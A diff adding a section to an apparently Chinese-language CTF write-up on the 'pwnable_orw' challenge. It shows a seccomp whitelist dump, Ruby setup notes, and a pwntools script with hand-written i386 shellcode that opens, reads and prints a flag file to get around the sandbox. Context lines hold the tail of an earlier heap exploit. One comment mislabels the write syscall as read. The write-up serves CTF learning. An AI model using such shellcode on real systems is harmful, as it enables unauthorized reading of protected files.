@@ -484,3 +484,69 @@ write(5, b'1'*0xb + p64(gadget) + p64(libc_realloc+16))   # overwrite
 create(0x20)
 p.interactive()
 ```
+
+### pwnable_orw
+从这个题目学到了和`prctl`函数[有关的新的知识点](https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/#prtcl)。简单的来说就是沙箱过滤规则，而且这里用的是白名单方法。文章里面提到可以切换CPU模式，不过我还是搞不出来；最后看了其他人的文章，原来可以不拉起shell、而直接打开/读取/输出flag文件(open, read, write)～
+
+```shell
+seccomp-tools dump ./orw
+ line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011
+ 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011
+ 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011
+ 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011
+ 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011
+ 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011
+ 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011
+ 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011
+ 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)
+ 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+```
+
+seccomp-tools这个工具要求ruby2.4以上，然而ubuntu16.04自带的是2.3。有鉴于过往升级系统自带软件有可能存在的坑，所以就用了一个叫[rbenv](https://github.com/rbenv/rbenv)([rbenv-installer](https://github.com/rbenv/rbenv-installer))的工具管理ruby版本，只是这玩意儿安装起来速度慢的一批得加速一下。
+
+```
+#!/usr/bin/python3.6
+from pwn import *
+
+executable = './orw'
+p = process(executable)
+#p = remote('node3.buuoj.cn', 25119)
+
+payload = asm("""
+    xor eax, eax    
+    push eax            #null byte
+    push 0x67616c66
+    push 0x2f2f2f2e 
+    mov ebx, esp        #arg1, pointer to ".///flag"
+    mov ecx, eax        #arg2, O_RONLY
+    mov edx, eax        #arg3, 0
+    push 0x5
+    pop eax             #syscall 0x5 for open 
+    int 0x80            #invoke
+    
+    mov ebx, eax        #arg1, fd
+    mov ecx, esp        #arg2, buf
+    sub esp, 0x30       #buf
+    push 0x2a           
+    pop edx             #arg3, bytes
+    push 0x3
+    pop eax             #syscall 0x3 for read
+    int 0x80
+    
+    xor ebx,ebx         
+    mov bl,0x1          #arg1, STDOUT
+    push 0x2a           
+    pop edx             #arg3, bytes
+    push 0x4
+    pop eax             #syscall 0x3 for read
+    int 0x80
+""")
+
+payload += b'1'*(0xc8- len(payload))
+p.send(payload)
+p.interactive()
+```
